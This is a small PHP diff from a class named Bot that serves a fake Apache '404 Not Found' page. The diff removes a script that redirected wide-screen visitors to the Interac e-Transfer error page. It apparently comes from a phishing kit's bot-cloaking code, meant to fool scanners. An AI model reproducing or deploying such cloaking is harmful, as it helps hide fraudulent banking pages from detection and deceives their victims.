@@ -29,7 +29,7 @@ class Bot{
 		<p>The requested URL '.Bot::pathInfo().' was not found on this server.</p>
 		<p>Additionally, a 404 Not Found
 		error was encountered while trying to use an ErrorDocument to handle the request.</p>
-		</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>';
+		</body></html>';
         die;
     }
     public static function checkbot(){
